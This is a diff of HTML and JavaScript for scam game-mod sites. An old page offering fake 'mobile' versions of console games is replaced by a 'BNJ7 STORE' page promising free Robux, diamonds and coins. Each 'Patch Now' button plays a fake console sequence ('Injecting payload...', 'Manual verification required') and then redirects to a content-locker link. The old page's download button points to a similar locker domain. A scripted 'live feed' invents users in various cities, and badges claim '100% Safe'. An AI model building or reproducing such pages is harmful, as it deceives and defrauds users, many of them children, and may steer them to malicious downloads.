@@ -1,235 +1,523 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>jafw.0 - PlayStation games</title>
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
- font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;
- background:#000;color:#fff;min-height:100vh
+  <meta charset="UTF-8" />
+  <title>primemods - Premium Patched Games & Apps</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="https://primemods.pro/img/favicon.ico" type="image/x-icon" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+  background: #0e0e0e;
+  color: #eee;
+  font-family: 'Share Tech Mono', monospace;
+  margin: 0;
 }
 
-/* HEADER */
-header{
- background:#1a1a1a;
- padding:30px 20px;
- text-align:center;
- border-bottom:1px solid #2a2a2a
+.hero-header {
+  background: radial-gradient(circle at center, #0f0f0f 0%, #000 100%);
+  padding: 50px 20px;
+  border-bottom: 2px solid #00ff99;
+  box-shadow: 0 0 30px #00ff99 inset;
 }
-h1{color:#4ade80;font-size:32px}
-.extension{color:#4ade80}
-.tagline{color:#fbbf24;font-size:14px}
-
-/* SEARCH */
-.search-section{padding:20px;max-width:600px;margin:auto}
-#filter{
- width:100%;
- padding:15px 20px;
- background:#1a1a1a;
- border:1px solid #333;
- border-radius:10px;
- color:#fff
+.hero-logo {
+  width: 80px;
+  height: 80px;
+  margin-bottom: 10px;
+  border-radius: 50%;
+  box-shadow: 0 0 20px #00ff99, 0 0 40px #00ff99;
 }
-
-/* GAME CARD */
-.games-container{max-width:1200px;margin:auto;padding:20px}
-.game-card{
- display:flex;align-items:center;
- background:#1a1a1a;
- border-radius:12px;
- padding:15px;margin-bottom:15px;
- cursor:pointer;
- border:1px solid #2a2a2a;
- transition:.3s
+.hero-title {
+  font-size: 2em;
+  color: #00ff99;
+  text-shadow: 0 0 10px #00ff99, 0 0 20px #00ff99;
+  margin: 0;
 }
-.game-card:hover{border-color:#4ade80;transform:translateX(5px)}
-.game-img{
- width:70px;height:70px;
- border-radius:8px;
- object-fit:cover;margin-right:15px
+.hero-tagline {
+  font-size: 1em;
+  color: #ccc;
+  margin-top: 10px;
 }
-.game-author{color:#4ade80;font-size:12px}
-.game-title{font-size:16px;font-weight:600}
-.game-description{color:#888;font-size:13px}
-
-/* MODAL */
-.processing-modal{
- display:none;
- position:fixed;
- inset:0;
- background:rgba(0,0,0,.9);
- z-index:9999;
- align-items:center;
- justify-content:center
+.cursor {
+  color: #00ff99;
+  animation: blink 1s infinite;
 }
-.processing-content{
- background:#1a1a1a;
- padding:30px;
- border-radius:15px;
- max-width:360px;width:100%
-}
-.progress-bar-container{
- background:#333;
- height:14px;border-radius:10px;
- overflow:hidden
-}
-.progress-bar{
- background:#4ade80;
- height:100%;width:0%;
- text-align:center;
- font-size:11px;
- font-weight:700;
- color:#000
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0; }
 }
 
-/* DOWNLOAD BUTTON */
-.btn-down{
- margin-top:20px;
- width:100%;
- background:#4ade80;
- color:#000;
- border:none;
- padding:15px;
- border-radius:10px;
- font-size:16px;
- font-weight:700;
- cursor:pointer;
+.feature-badges {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  justify-content: center;
+  margin-top: 10px;
 }
-.btn-down:hover{background:#22c55e}
-</style>
+.feature-badge {
+  font-size: 0.7em;
+  padding: 4px 8px;
+  border-radius: 12px;
+  border: 1px solid #00ff99;
+  color: #00ff99;
+  background: rgba(0, 255, 153, 0.1);
+  text-shadow: 0 0 5px #00ff99;
+}
+.feature-badge.safe::before { content: " "; }
+.feature-badge.no-root::before { content: " "; }
+.feature-badge.instant::before { content: " "; }
+.feature-badge.ai::before { content: " "; }
+
+
+.search-bar {
+  background: #111;
+  padding: 20px 0;
+  box-shadow: 0 2px 10px rgba(0, 255, 153, 0.2);
+}
+.search-wrapper {
+  max-width: 500px;
+  margin: 0 auto;
+  position: relative;
+}
+.search-wrapper input {
+  width: 100%;
+  padding: 12px 20px;
+  background: #1a1a1a;
+  border: 2px solid #00ff99;
+  border-radius: 30px;
+  color: #eee;
+  font-size: 0.9em;
+  transition: 0.3s;
+}
+.search-wrapper input:focus {
+  outline: none;
+  box-shadow: 0 0 15px #00ff99;
+  border-color: #00ff99;
+}
+
+.app-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr); /* default desktop = 3 per row */
+  gap: 15px;
+  padding: 20px;
+}
+
+@media (max-width: 768px) {
+  .app-grid {
+    grid-template-columns: repeat(2, 1fr); /* tablet/mobile = 2 per row */
+  }
+}
+
+
+
+/* ðŸ”¥ FIXED APP CARD STYLING */
+.app-card {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 12px;
+  padding: 10px;
+  text-align: center;
+  position: relative;
+  transition: transform 0.2s, box-shadow 0.2s, opacity 0.3s ease;
+  opacity: 1;
+
+  display: flex;                /* make card a column flexbox */
+  flex-direction: column;
+  justify-content: flex-start;
+  min-height: 260px;            /* keeps cards uniform height */
+}
+.app-card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+}
+.app-card img {
+  width: 100%;
+  height: 120px;          /* increase if needed */
+  object-fit: contain;    /*  no cropping */
+  background: #111;       /* background fill so it looks neat */
+  border-radius: 6px;
+}
+.app-title {
+  font-weight: 600;
+  font-size: 0.9em;
+  margin-top: 5px;
+}
+.app-desc {
+  font-size: 0.75em;
+  color: #ccc;
+  margin: 3px 0 6px;
+}
+.app-tags {
+  font-size: 0.65em;
+  color: #7cb342;
+}
+.stars {
+  font-size: 0.8em;
+  margin-bottom: 6px;
+}
+.app-button {
+  width: 100%;
+  padding: 6px;
+  border: none;
+  border-radius: 20px;
+  font-size: 0.8em;
+  background: linear-gradient(135deg, #00b09b, #96c93d);
+  color: #fff;
+  cursor: pointer;
+
+  margin-top: auto;   /*   always pushes button to bottom */
+}
+
+.modal-content {
+  background: #000;
+  color: #00ff00;
+  border: 2px solid #00ff00;
+  border-radius: 10px;
+  font-size: 0.9em;
+}
+#patch-console {
+  text-align: left;
+  min-height: 180px;
+  max-height: 300px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  font-size: 0.85em;
+  padding: 10px;
+  background: rgba(0,255,0,0.05);
+}
+.progress-bar {
+  background-color: #00ff00;
+  box-shadow: 0 0 10px #00ff00;
+}
+
+#telegram-floating {
+  position: fixed;
+  bottom: 15px;
+  right: 15px;
+  background: #222;
+  color: #eee;
+  padding: 6px 10px;
+  border-radius: 20px;
+  display: flex;
+  align-items: center;
+  text-decoration: none;
+  box-shadow: 0 4px 8px rgba(0,0,0,0.4);
+}
+#telegram-floating img {
+  width: 20px;
+  margin-right: 6px;
+}
+#live-feed {
+  position: fixed;
+  bottom: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(0, 0, 0, 0.85);
+  color: #00ff99;
+  padding: 6px 14px;
+  border-radius: 20px;
+  font-size: 0.8em;
+  box-shadow: 0 0 10px #00ff99;
+  opacity: 0;
+  transition: opacity 0.5s ease, bottom 0.5s ease;
+  z-index: 9999;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  max-width: 90vw;
+}
+
+  </style>
+<link rel="me" href="https://www.blogger.com/profile/17069023153228290428" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
-
 <body>
 
-<header>
- <h1>jafw<span class="extension">.0.club</span></h1>
- <p class="tagline">- PlayStation games on your phone -</p>
+<header class="hero-header">
+  <div class="container text-center">
+    <img src="https://i.ibb.co/rRv933ZF/WA-1772746879908.jpg" alt="Buxwon" class="hero-logo">
+    <h1 class="hero-title">BNJ7•STORE</h1>
+    <p class="hero-tagline"><span id="typed-text"></span><span class="cursor">|</span></p>
+
+    <div class="feature-badges mt-3">
+      <span class="feature-badge safe">100% Safe</span>
+      <span class="feature-badge no-root">No Root Required</span>
+      <span class="feature-badge instant">Instant Download</span>
+      <span class="feature-badge ai">AI Powered</span>
+    </div>
+  </div>
 </header>
 
-<section class="search-section">
- <input type="text" id="filter" placeholder="Search...">
-</section>
-
-<div class="games-container" id="games-list"></div>
-
-<!-- PROCESSING MODAL -->
-<div class="processing-modal" id="processing-modal">
- <div class="processing-content">
-  <h3 style="text-align:center">Injecting...</h3>
-  <p id="processing-msg" style="text-align:center;color:#888;margin-bottom:15px">
-   Connecting...
-  </p>
-
-  <div class="progress-bar-container">
-   <div class="progress-bar" id="progress-bar">0%</div>
+<div class="search-bar">
+  <div class="container">
+    <div class="search-wrapper">
+      <input type="text" id="filter" placeholder=" Search for apps, games, or tools...">
+    </div>
   </div>
- </div>
 </div>
 
-<script>
-const games=[
-{title: "ROBLOX MOD", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHR3MLgafVdUcykzHfKbyPIkawikStjfrWf5S5DXMX3g&s=10", desc: "Realistic bike racing with unlimited money."},
-            {title: "HAYTALE ", img: "https://blogger.googleusercontent.com/img/a/AVvXsEiZj_9ZSrEjFbx6E22UMOyF5YErCLl5glSa89w1dYm2M9-qOEeWBeXOL7K0FdqMyWGXjHUL4hdybcU2JjzRsZibaRyxVZT2CDW02ixjuQl2NT7Me_pW28n32vL_nnnuQ1FIaH1CMsB5LsdK3EEaYHy9hvg2C4kLr3u_ZJ6u8p_Pr_lNNLOHUPCI4C1WE6w", desc: "Martial arts action with unlimited skills."},
-            {title: "Rooftops & alleys", img: "https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2703850/7a62174321720853b2b79ab1dfd554e8f0a491f7/header.jpg", desc: "Parkour gameplay with mod menu."},
-            {title: "Beamng drive mobile", img: "https://s3.amazonaws.com/gameopedia_covers/covers/1653727/4508fc3bbbcf6b9c440498af6900703b.jpg", desc: "Realistic driving with unlimited cars."},
-            {title: "Rematch mobile", img: "https://image.api.playstation.com/vulcan/ap/rnd/202412/1301/bf53eec311119801d096ef4c5e05ef0feb20c365e568e344.png", desc: "Fast matches with unlocked features."},
-            {title: "The Last of Us 2 Mobile", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR_QLpsv0DmfifEZ2VzQikiK0MwI9q67zBfmLhdAyY2jjvz9bJQ50TH3Wo8K_7u-nmAfgo", desc: "Story-driven survival with unlimited resources."},
-            {title: "Ghost of Tsushima Mobile", img: "https://image.api.playstation.com/vulcan/ap/rnd/202010/0222/b3iB2zf2xHj9shC0XDTULxND.png", desc: "Samurai adventure with unlimited gold."},
-            {title: "Assassin's Creed Mirage Mobile", img: "https://upload.wikimedia.org/wikipedia/en/2/23/Assassin%27s_Creed_Mirage_cover.jpeg", desc: "Stealth action with unlimited coins."},
-            {title: "Inside Mobile", img: "https://i.pinimg.com/originals/1c/f3/18/1cf3189182c0590efb17a040fd06ce26.jpg", desc: "Full dark adventure unlocked."},
-            {title: "Red Dead Redemption 2 Mobile", img: "https://upload.wikimedia.org/wikipedia/en/4/44/Red_Dead_Redemption_II.jpg", desc: "Open-world western with unlimited money."},
-            {title: "God of War Mobile", img: "https://upload.wikimedia.org/wikipedia/en/a/a7/God_of_War_4_cover.jpg", desc: "Epic battles with mod menu."},
-            {title: "Watch Dogs 2 Mobile", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTUDaodqzabJjva89BxfdNBoiQKKi9fxiIFqrcagehTh0jUsErvqMcg-qO_SB7kVBSJSl0", desc: "Open-world hacking with unlimited money."},
-            {title: "Dragon Ball FighterZ Mobile", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1o7xnV5SSOYbeaS-HVFZHEzwOw9xyMicsiXAVz5ozzzeCqrrw75yaGiaW6szFdYqpCrc", desc: "Anime fighting with all characters."},
-            {title: "Attack on Titan 2 Mobile", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkZv0OWHlfzoO76qR_ODMksRDO0LZJBM_dCUA9lwq7bIimmWXVdkHc0Bd_ncEzoSxQ1kA", desc: "Intense battles with unlimited materials."},
-            {title: "Naruto Ultimate Ninja Storm 4 Mobile", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMgpJvG3oMtOazNyEO85gmgbUaCNUPT2ZTZs4j23Ld7EvrRSNAkAiUNTKEHkSEj1cKm6I", desc: "Ninja fights with all characters unlocked."},
-            {title: "GTA 5 Mobile", img: "https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png", desc: "Open-world crime with unlimited cash."},
-            {title: "Minecraft Mobile", img: "https://static.vecteezy.com/system/resources/thumbnails/002/948/768/small_2x/pixel-minecraft-style-land-background-vector.jpg", desc: "Creative survival with unlimited resources."},
-            {title: "Cuphead Mobile", img: "https://s3.amazonaws.com/gameopedia_covers/covers/907134/4bafba8d6811e04e85c7e9646cf5177a.png", desc: "Classic boss fights fully unlocked."},
-            {title: "Spider-Man 2 Mobile", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTUigJth3hPq66ph0P44XG3gME4UMQm2NFj5vqjajLViFe1cqAoqIXC84t0hoTl8W2-4D4", desc: "Superhero action with unlimited upgrades."},
-            {title: "Counter Strike 2 Mobile", img: "https://s3.amazonaws.com/gameopedia_covers/covers/3271386/3c83b35f11599402266a671290beb516.jpg", desc: "FPS action with unlimited money."},
-            {title: "Jump Force Mobile", img: "https://s3.amazonaws.com/gameopedia_covers/covers/883593/4b392164f89981c794c943b22936cff3.jpg", desc: "Anime crossover with all fighters."},
-            {title: "Elite auto brasil Mod", img: "https://i.postimg.cc/cC5SqQNL/unnamed.jpg", desc: "Driving game with unlimited money."},
-            {title: "Hollow knight silksong", img: "https://i.postimg.cc/YS1M4GQd/images-3.jpg", desc: "Full game access adventure."},
-            {title: "Rocket league mobile", img: "https://i.postimg.cc/s2F3D9GB/images-2.jpg", desc: "Car soccer with unlimited items."},
-            {title: "One piece mugen", img: "https://i.postimg.cc/rmjTJBnW/images-5.jpg", desc: "Fighting game with all characters."},
-            {title: "One piece fighting path", img: "https://i.postimg.cc/G2drvLQd/images-4.jpg", desc: "Anime action with unlimited gems."},
-            {title: "Jujutsu Kaisen Cursed Clash", img: "https://i.postimg.cc/7ZYNvfm6/images.jpg", desc: "Anime battles with unlocked characters."},
-            {title: "Hajime No Ippo The Fighting", img: "https://i.postimg.cc/0y2Cgbcy/images-(1).jpg", desc: "Boxing fights with unlimited stamina."},
-            {title: "RDR Mobile", img: "https://play-lh.googleusercontent.com/SBpKtn6H9H050lQaUHjP9IITtCpb03yLj2q929lLzvl68UCAdqyUWfkyvJDeOUu0Ta8", desc: "Wild west action with unlimited gold."},
-            {title: "WWE 2K25 Mobile", img: "https://i.postimg.cc/Jz4QwGP4/images-(2).jpg", desc: "Wrestling action with all unlocks."},
-            {title: "Days Gone Mobile", img: "https://i.postimg.cc/YCqxchbp/images-(3).jpg", desc: "Survival gameplay with unlimited resources."},
-            {title: "Horizon Zero Dawn Mobile", img: "https://i.postimg.cc/P5rMGP2X/images-(4).jpg", desc: "Open-world adventure with unlimited shards."},
-            {title: "Euro Truck Simulator", img: "https://i.postimg.cc/MpKYkvdx/images-(5).jpg", desc: "Truck driving with unlimited money."},
-            {title: "Assetto Corsa Mobile", img: "https://i.postimg.cc/W1b7RhXT/images-(6).jpg", desc: "Realistic racing with unlocked cars."},
-            {title: "Fifa Street Mobile", img: "https://i.postimg.cc/W1b7RhXV/images-(7).jpg", desc: "Street football with unlimited skills."},
-            {title: "Getaway 2", img: "https://i.postimg.cc/W1q2vfzL/images-1.jpg", desc: "Crime action with unlimited money."},
-            {title: "Mini soccer star Mod", img: "https://i.postimg.cc/L5sp0xwW/images.jpg", desc: "Arcade football game with unlimited money and unlocked skills."},
-            {title: "Kimetsu no yaiba thc 2", img: "https://i.postimg.cc/BQpX7zyq/Screenshot-2025-09-19-211151.png", desc: "Demon slayer battles with all characters."},
-            {title: "Forza Horizon 5 Mobile", img: "https://s3.amazonaws.com/gameopedia_covers/covers/1824621/d5e0490d7a06ac352730a2a444d432df.jpg", desc: "Open-world racing with unlimited credits."},
-            {title: "Haytale mobile", img: "https://s3.amazonaws.com/gameopedia_covers/covers/2990068/33996ceea154cd64c6825c9ac5fd9327.jpg", desc: "Sandbox RPG world with creative freedom and unlocked content."},
-            {title: "Avatar : from the ashes", img: "https://lumiere-a.akamaihd.net/v1/images/hb_avatar_frontiersofpandora_fromtheashes_mobile_banner_9f40cffb.jpeg?region=0,0,1024,768&width=960", desc: "Epic open-world adventure with enhanced powers and full access."},
-            {title: "Snow Runner", img: "https://hb.imgix.net/d8e9fd4f19bc311690d90d8985e7656c7bde4726.jpg?auto=compress,format&fit=crop&h=353&w=616&s=c5e68257625425040f403168652672a0", desc: "Extreme off-road driving with unlimited vehicles and resources."},
-            {title: "Etiket pro", img: "https://www.modeditor.com/wp-content/uploads/2022/12/etiketPro.jpg", desc: "Smart productivity tools with full pro features unlocked."},
-            {title: "The crew motor fest", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ5-kX08El7Dwbp5W60Yw86eN77Z6GnshUlc5cSNHkNEysyA1vRp-TiEkM_81liL1kvr8", desc: "Open-world racing festival with unlocked cars and endless events."},
-            {title: "Skate 4", img: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQC3Cmqkdm3XPQ4XwZQbijrG8xE3ZsoP753fW23ZWc_-adcB8a_hH-k8FmMEI3zY5E1sn4", desc: "Realistic skateboarding with total freedom and unlimited tricks."},
-            {title: "Left 4 dead 2", img: "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c3f5e888-9edb-41d5-9cec-ad06280152e9/d55x3hp-3291ab4a-bc31-41b5-95ef-98e17fdc4e6a.png/v1/fit/w_512,h_512/left_4_dead_2_game_icon_by_mec120_d55x3hp-375w-2x.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NTEyIiwicGF0aCI6Ii9mL2MzZjVlODg4LTllZGItNDFkNS05Y2VjLWFkMDYyODAxNTJlOS9kNTV4M2hwLTMyOTFhYjRhLWJjMzEtNDFiNS05NWVmLTk4ZTE3ZmRjNGU2YS5wbmciLCJ3aWR0aCI6Ijw9NTEyIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmltYWdlLm9wZXJhdGlvbnMiXX0.YR_d9xJ-zib884mTw8iOMamEvzbQuWM0b41ZwuepNyo", desc: "Intense co-op zombie survival with full campaigns unlocked."}
-        ];
-
-const list=document.getElementById("games-list");
-const modal=document.getElementById("processing-modal");
-const bar=document.getElementById("progress-bar");
-const msg=document.getElementById("processing-msg");
-
-function render(){
- list.innerHTML=games.map(g=>`
-  <div class="game-card">
-   <img src="${g.img}" class="game-img">
-   <div>
-    <div class="game-author">jafw.0</div>
-    <div class="game-title">${g.title}</div>
-    <div class="game-description">${g.desc}</div>
-   </div>
+<div class="app-grid">
+    
+    <div class="app-card">
+    <img src="https://downloadr2.apkmirror.com/wp-content/uploads/2019/01/5c46e8d4bffce-384x384.png" alt="Roblox">
+    <div class="app-title">FREEFIRE 2018</div>
+    <div class="app-desc">Get Unlimited Robux For Free</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Roblox', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
   </div>
- `).join("");
+  
+  <div class="app-card">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMTPq16he7KQwBZq8xSjfR0RqSW24iCprackzoC-_TRw&s" alt="Survival">
+    <div class="app-title">Red Dead Mobile</div>
+    <div class="app-desc">Get Unlimited Diamonds For Free</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Roblox', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  <div class="app-card">
+    <img src="https://static0.makeuseofimages.com/wordpress/wp-content/uploads/2013/09/gta-v-featured.jpg?w=1200&h=628&fit=crop" alt="Gossip Harbor">
+    <div class="app-title">grand theft auto V</div>
+    <div class="app-desc">Get Unlimited Energy & Coins</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Gossip Harbor', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  <div class="app-card">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS04qUw_Upu3H0Thwv42E2bXbnvjzFhnkc8qKEkYUjEuQ&s" alt="Car Parking">
+    <div class="app-title">Beta Roblox </div>
+    <div class="app-desc">Get Unlimited Money For Free</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Car Parking', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  <div class="app-card">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQpS2FSrt3idV_iVwQYYYXRpuB_XsHaLXJYbB4GR-lzfkh0ZDVyfifu0Ae_&s=10" alt="Avatar World">
+    <div class="app-title">Avatar World</div>
+    <div class="app-desc">Get Unlimited Free Coins</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Avatar World', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  <div class="app-card">
+    <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/570d499d-ae96-4ee1-ae00-411fa787e04c/di36w3k-857afbc9-72e2-4108-a2c6-034227436d3f.png/v1/fill/w_512,h_512/carx_street_icon_by_coldgloom_di36w3k-fullview.png" alt="Avatar World">
+    <div class="app-title">CarX street</div>
+    <div class="app-desc">Get Unlimited Everything</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Avatar World', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  <div class="app-card">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtkszgjRDuzlkxY-dYc0ZNvNq91pDSVCQAJo29l15edg&s" alt="The Spike">
+    <div class="app-title">The Spike</div>
+    <div class="app-desc">Get Unlimited Volleyballs, Coins ETC</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Spike', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+    
+  
+  <div class="app-card">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_yM2CJJdjMarqScTTLk3qW3iSoPYEUVnVeTbjD6-pEA&s" alt="Pocket FM">
+    <div class="app-title">Pocket FM</div>
+    <div class="app-desc">Free Unlimited Coins</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Roblox', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  
+  <div class="app-card">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8WSj4IBTYJuuxogvhvZmFxX7lkIvKc3-4jp2zNOHRZw&s=10" alt="Avatar World">
+    <div class="app-title">Dragon City</div>
+    <div class="app-desc">Free Golds And Gems</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Avatar World', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  
+  <div class="app-card">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSU7lXBbhza8Oa_mqBSDUxCfGHl0LmD7aq6ew&s" alt="Avatar World">
+    <div class="app-title">Whiteout Survival Hack</div>
+    <div class="app-desc">Free Gems</div>
+    <div class="app-tags">Android & iOS</div>
+    <div class="stars"></div>
+    <button class="app-button" onclick="startPatching('Whiteout Survival', 'https://lockedpage1.website/cl/v/1xx98x')">Patch Now</button>
+  </div>
+  
+  
 
- document.querySelectorAll(".game-card").forEach(c=>{
-  c.onclick=startProcess;
- });
-}
-render();
+</div>
 
-function startProcess(){
- modal.style.display="flex";
- let progress=0;
+<a href="https://t.me/+4LlVqZYs7bY3N2Y8" id="telegram-floating" target="_blank">
+  <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="TG"> Help
+</a>
 
- let int=setInterval(()=>{
-  progress+=Math.floor(Math.random()*10)+5;
-  if(progress>100)progress=100;
+<div class="modal fade" id="patchModal" tabindex="-1" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered modal-lg">
+    <div class="modal-content">
+      <div id="patch-console">[+] Initializing patching tool...</div>
+      <div class="progress mt-2">
+        <div id="patch-progress-bar" class="progress-bar progress-bar-striped progress-bar-animated" style="width:0%"></div>
+      </div>
+    </div>
+  </div>
+</div>
 
-  bar.style.width=progress+"%";
-  bar.textContent=progress+"%";
+<div id="live-feed"></div>
 
-  if(progress>=100){
-   clearInterval(int);
-   msg.textContent="Ready to download";
 
-   document.querySelector(".processing-content").insertAdjacentHTML(
-    "beforeend",
-    `<button class="btn-down" onclick="location.href='https://confirmapp.online/cl/i/1xx98x';".fadeIn()">
-      Download
-     </button>`
-   );
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+const phrases = [
+  "Patching made easy.",
+  "Bypass restrictions in seconds.",
+  "Premium mods for iOS & Android."
+];
+let currentPhrase = 0;
+let currentChar = 0;
+
+function typeTagline() {
+  const el = document.getElementById('typed-text');
+  if (currentChar < phrases[currentPhrase].length) {
+    el.textContent += phrases[currentPhrase].charAt(currentChar);
+    currentChar++;
+    setTimeout(typeTagline, 100);
+  } else {
+    setTimeout(() => {
+      el.textContent = '';
+      currentChar = 0;
+      currentPhrase = (currentPhrase + 1) % phrases.length;
+      typeTagline();
+    }, 2000);
   }
- },600);
 }
+typeTagline();
+
+function startPatching(appName, link) {
+  const consoleEl = document.getElementById('patch-console');
+  const barEl = document.getElementById('patch-progress-bar');
+  const modal = new bootstrap.Modal(document.getElementById('patchModal'));
+  consoleEl.textContent = '[+] Initializing patching tool...\n';
+  barEl.style.width = '0%';
+  modal.show();
+
+  const steps = [
+    `[+] Connecting to ${appName} servers...`,
+    `[+] Authenticating...`,
+    `[+] Injecting payload...`,
+    `[+] Uploading patch files...`,
+    `[+] Finalizing patch...`,
+    `[+] Verifying integrity...`,
+    `[+] Automatic verification failed.`,
+    `[+] Manual verification required.`,
+    `[+] Redirecting...`
+  ];
+
+  let step = 0;
+  let progress = 0;
+  const interval = setInterval(() => {
+    if (step < steps.length) {
+      typeLine(consoleEl, steps[step]);
+      progress += Math.floor(100 / steps.length);
+      barEl.style.width = `${progress}%`;
+      step++;
+    } else {
+      clearInterval(interval);
+      barEl.style.width = '100%';
+      setTimeout(() => window.location = link, 1000);
+    }
+  }, 800);
+}
+
+function typeLine(el, text) {
+  let i = 0;
+  const typer = setInterval(() => {
+    if (i < text.length) {
+      el.textContent += text.charAt(i);
+      el.scrollTop = el.scrollHeight;
+      i++;
+    } else {
+      el.textContent += '\n';
+      clearInterval(typer);
+    }
+  }, 20);
+}
+
+document.getElementById('filter').addEventListener('input', function(e) {
+  const value = e.target.value.toLowerCase();
+  const grid = document.querySelector('.app-grid');
+  const cards = Array.from(grid.children);
+
+  const matched = [];
+  const unmatched = [];
+
+  cards.forEach(card => {
+    const title = card.querySelector('.app-title').textContent.toLowerCase();
+    if (title.includes(value)) {
+      matched.push(card);
+      card.style.opacity = "1";
+      card.style.pointerEvents = "auto";
+    } else {
+      unmatched.push(card);
+      card.style.opacity = "0.1";  // Change to "0" if you want to fully hide
+      card.style.pointerEvents = "none";
+    }
+  });
+
+  // Reorder the cards: matched first
+  cards.forEach(card => grid.removeChild(card));
+  matched.forEach(card => grid.appendChild(card));
+  unmatched.forEach(card => grid.appendChild(card));
+});
+
+
+const liveFeedApps = [
+  "Roblox",
+  "Crash Bandicoot 4",
+  "FIFA 21 Mobile"
+];
+
+const liveFeedCountries = [
+  "New York",
+  "London",
+  "Mumbai",
+  "Berlin",
+  "Tokyo",
+  "Paris",
+  "Sydney",
+  "Toronto",
+  "Dubai"
+];
+
+function showLiveFeed() {
+  const feedEl = document.getElementById('live-feed');
+  setInterval(() => {
+    const app = liveFeedApps[Math.floor(Math.random() * liveFeedApps.length)];
+    const country = liveFeedCountries[Math.floor(Math.random() * liveFeedCountries.length)];
+    feedEl.textContent = `ðŸš€ Someone from ${country} used ${app}.`;
+    feedEl.style.opacity = 1;
+    feedEl.style.bottom = "20px";
+    setTimeout(() => {
+      feedEl.style.opacity = 0;
+      feedEl.style.bottom = "10px";
+    }, 3000);
+  }, 4000); // new message every 4 seconds
+}
+
+showLiveFeed();
 </script>
 
